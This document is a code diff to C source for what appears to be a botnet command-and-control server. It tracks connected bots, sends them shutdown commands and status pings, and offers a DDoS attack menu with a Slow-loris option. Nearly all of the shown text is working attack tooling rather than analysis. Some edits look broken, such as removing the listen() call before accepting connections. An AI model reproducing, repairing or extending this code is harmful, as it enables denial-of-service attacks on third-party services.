@@ -5,7 +5,6 @@
  */
 
 CONNS cons;
-char STOPFLAG = 0;
 pthread_t accept_thread;
 int main_sock;
 struct sockaddr_in serverAddr;
@@ -42,20 +41,19 @@ void init()
 {
 	main_sock = make_socket();
 	bind_socket(main_sock, 15551, &serverAddr);
-	listen(main_sock, 8);
-	pthread_create(&accept_thread, NULL, accept_handler, &main_sock);
+	pthread_create(&accept_thread, NULL, accept_handler, NULL);
 	
 }
 
 void close_all()
 {
 	// Stop Receiving Connections by connecting to the other thread.
-	STOPFLAG = 1;
-	pthread_join(accept_thread, NULL);
+	pthread_kill(accept_thread, 2);
 	struct connections *connects = &cons;
-	while(connects->next != NULL){
+	send_to_bots("[!SHUTDOWN!]");
+	while(connects != NULL){
 		// here sould have a protocol that will close the connection for a bot and cause it to stop running. 
-		close_socket(connects->sock);
+		close(connects->sock);
 		printf("Connection Closed From : %s\n", inet_ntoa(connects->client_conn.sin_addr));
 		connects = connects->next;
 	}
@@ -117,6 +115,7 @@ void ddos()
 	while(1){
 		printf("%s", ddos_options);
 		fgets(reply, 5, stdin);
+		memset(to_send, '\x00', 64);
 
 		if(strncmp(reply, "1", 1) == 0){
 			printf("[*] Selected DDos -> Slow-loris\n");
@@ -225,19 +224,25 @@ void ls_all_bots()
 {
 	struct connections *connects = &cons;
 	int i = 0;
-	char temp[10];
+	char temp[8];
 	int temp_size;
+	printf("\n");
 
-	while(connects->next != NULL){
-		printf("%d\n", i);
-		if(sendto(connects->sock, "UP?", 3, 0, (struct sockaddr *)&connects->client_conn, sizeof(struct sockaddr)) != -1) {
+	while(connects != NULL){
+		if(sendto(connects->sock, "UP?", 3, 0, (struct sockaddr *)&connects->client_conn, sizeof(struct sockaddr)) == -1) {
 			connects = connects->next;
+			// DEBUG
+			printf("Exiting UP?\n");
+			perror("Unable Send data");
 			continue;
 		}
 		
 		temp_size = sizeof(struct sockaddr);
 
-		recvfrom(connects->sock, temp, 9, 0, (struct sockaddr *)&connects->client_conn, &temp_size);
+		recvfrom(connects->sock, temp, 8, 0, (struct sockaddr *)&connects->client_conn, &temp_size);
+		
+		// DEBUG
+		printf("Data: %s\n", temp);
 
 		if(strncmp(temp, "?YES!", 5) == 0) {
 			printf("# %d Connection From => %s\n", i, inet_ntoa(connects->client_conn.sin_addr));
